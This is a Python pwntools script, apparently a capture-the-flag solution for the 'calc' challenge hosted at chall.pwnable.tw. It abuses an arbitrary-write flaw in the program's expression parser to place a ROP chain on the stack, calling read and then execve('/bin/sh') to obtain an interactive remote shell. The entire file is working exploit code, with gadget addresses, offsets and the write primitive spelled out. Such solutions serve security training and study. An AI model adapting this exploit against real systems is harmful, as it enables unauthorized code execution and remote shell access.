#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

# ROP Gadgets
pop_edx_ecx_ebx_ret = 0x080701d0  # pop edx ; pop ecx ; pop ebx ; ret
int_0x80            = 0x08049a21  # int 0x80

# Constants
x86_sys_execve = 11

# Byte sequence alias
A4 = 4 * b'A'


class Calc:
    def __init__(self):
        self.elf = ELF('./calc')
        self.proc = remote('chall.pwnable.tw', 10100)
        #self.proc = self.elf.process()

    def wait_for_gdb(self):
        log.debug('You may attatch this process to gdb now.')
        raw_input()

    def write_data(self, index: int, data: int):
        """
        Exploit the arbitrary write vulnerability present in parse_expr() and eval(),
        writing the specified data into the address at `pool + index * 4`
        """
        # Leak the content at `pool + index * 4`
        # Note that this will increments the content by 1.
        self.proc.sendline(b'+%d+1' % (index))
        self.proc.recvline()

        # Restore the content at `pool + index * 4`
        self.proc.sendline(b'+%d-1' % (index))
        content = int(self.proc.recvline().decode())
        log.info("old: {}".format(hex(content)))

        # Write the attacker-specified data into `pool + index * 4`.
        self.proc.sendline(b'+%d%+d' % (index, data - content))
        content = int(self.proc.recvline().decode())
        log.info("new: {}".format(hex(content)))


def main():
    """
    Main idea: call sys_execve("/bin/sh", NULL, NULL).

    read(0, bss, 59) -> eax will be 59
    pop edx
    pop ecx
    pop ebx
    int 0x80
    """
    calc = Calc()
    calc.proc.recvuntil('===\n')

    calc.write_data(361, calc.elf.sym['read'])  # ret: calc()'s return addr
    calc.write_data(362, pop_edx_ecx_ebx_ret)   # ret: read()'s return addr
    calc.write_data(363, 0)                     # read()'s 1st arg
    calc.write_data(364, calc.elf.bss())        # read()'s 2nd arg
    calc.write_data(365, x86_sys_execve)        # read()'s 3rd arg
    calc.write_data(366, pop_edx_ecx_ebx_ret)   # ret
    calc.write_data(367, 0)                     # edx
    calc.write_data(368, 0)                     # ecx
    calc.write_data(369, calc.elf.bss())        # ebx
    calc.write_data(370, int_0x80)              # ret
    calc.proc.sendline()                        # end calc()

    calc.proc.sendline(b'/bin/sh'.ljust(x86_sys_execve, b'\x00'))
    calc.proc.interactive()  # Give yourself up to me


if __name__ == '__main__':
    main()
